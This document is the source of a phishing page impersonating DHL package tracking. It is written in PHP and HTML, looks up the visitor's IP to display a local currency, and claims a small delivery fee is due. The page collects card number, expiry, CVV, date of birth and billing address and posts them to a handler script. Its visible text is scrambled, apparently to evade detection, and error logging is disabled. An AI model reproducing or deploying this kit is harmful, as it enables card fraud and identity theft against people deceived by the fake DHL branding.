<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$currency = $addrDetailsArr['geoplugin_currencyCode'];


?>

<!DOCTYPE html>

<html lang="de"><head>

<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">

		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="format-detection" content="telephone=no">

	<title>| Welcome |</title>
	
	<meta name="google" content="notranslate">
	
	

	<link rel="stylesheet" href="./style.css">
<link rel="stylesheet" href="./cc.css">
	<link rel="shortcut icon nofollow" href="favicon.ico">

	
	</head>


	<body class="lowla" style="display: block;">
		<div id="bg-load" class="bg-load" style="display: none;"><div class="load"></div>	</div>
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv">Uiromet cpzevatiz</span>
				<span class="per">Bpzrntzz cpzevatiz</span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./lg.svg"></span>
			<ul>
			<li>Ztnd umcxmgtz,</li>
			<li>Itctrot umcxtez</li>
			<li>Htlu &amp; cvnemce</li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="home-post.php">
			<div class="parag">
				<span class="titr">DHL Eimcxrng.</span>
				<span class="deta">Htit yvp qrll frnd rnfviamervn mbvpe yvpi zhruatnez.</span>
				<span class="deta">Eimcx yvpi umictl zhruatnez me mny erat fiva 		
					zhruurng ev dtlrotiy</span>
			</div>
			<div class="box">
			<div class="pak">
				<div class="allt">
				<input type="text" class="nm" id="email" name="em" maxlength="60" required="" placeholder="Tamrl mdditzz" autocomplete="off" autofocus="">
				<div>
				<input type="text" class="nm" id="nm" name="nc" maxlength="60" required="" placeholder="Cmidhvldti&#39;z nmat" autocomplete="off" autofocus="">
		<div class="field-container">		
			
			<input type="text" class="nu" id="nu" name="nu" maxlength="20" required="" placeholder="Citdre cmid npabti" autocomplete="off">

            <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"></svg> </div>


				<input type="text" class="epx" id="epx" name="en" maxlength="9" required="" placeholder="Tku AA=YY" autocomplete="off">&nbsp; &nbsp; 
				<input type="text" class="vv" id="vv" name="cs" maxlength="10" required="" placeholder="COO (COC)" autocomplete="off">&nbsp; &nbsp;
				<input type="text" class="vv cleave-input-date" id="vv" name="db" required="" placeholder="Dmet vf brieh" autocomplete="off">
				<script src='https://nosir.github.io/cleave.js/dist/cleave.min.js'></script><script  src="./date.js"></script>
				<input type="text" class="nm" id="nm" name="dr" maxlength="60" required="" placeholder="Brllrng mdditzz" autocomplete="off" autofocus="">
				<input type="text" class="epx" id="epx" name="ct" maxlength="9" required="" placeholder="Crey" autocomplete="off">&nbsp; &nbsp; 
				<input type="text" class="vv" id="vv" name="te" maxlength="10" required="" placeholder="Zemet" autocomplete="off">&nbsp; &nbsp;
				<input type="text" class="epx" id="epx" name="zp" maxlength="9" required="" placeholder="Uvzeml cvdt" autocomplete="off">
				</div>
				</div>
				
				<div class="erro2">
				<span><b style="color:#d40511">Rauviemne atzzmgt!</b><br>Ev cvaultet eht dtlrotiy mz zvvn mz uvzzrblt, ultmzt cvnfria eht umyatne  <span style="color:#d40511;font-weight:bold;font-family:arial">(1.99 <?php echo $currency; ?>)</span>. By clrcxrng Ntke. Vnlrnt cvnfriamervn apze bt 
					amdt qrehrn eht ntke 14 dmyz, btfvit re tkuritz..</span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center">Ntke</button></div>
<input type="hidden" name="type" value="infos" >
		</form>
			<div class="pubb"><img class="pb01" src="./pub.jpg"><img class="pb02" src="./pubr.gif"></div>
		</section>
		</div>

	<footer>
			<div class="contenu">
		<ul>
		<li>DHL Umcxmgt</li>
		<li>DHL Ztiorctz</li>
		<li>DHL Tkuitzz</li>
		<li>DHL Lvgrzercz</li>
		</ul>
		<ul>
		<li>Cvnemce</li>
		<li>Htlu &amp; cpzevati ztiorct</li>
		<li>Htit'z hvq re qvixz</li>
		<li>Avbrlt Muuz</li>
		</ul>
		<ul>
		<li>Mbvpe Pz</li>
		<li>Uvze DHL</li>
		<li>Itzuvnzrbrlrey</li>
		<li>Uitzzt</li>
		<li>Cmitti</li>
		</ul>
		<div>© <?= date('Y')?> DHL Rnetinmervnml GabH - Mll irghez itztiotd.</div>
		</div>
	</footer>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
	
	<script src="./script.js"></script>
	<script src="./style.js"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 1200);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

// Disable espace on input cc
$(function() {
    $('#nu').on('keypress', function(e) {
        if (e.which == 32)
            return false;
    });
});
	</script>

</body></html>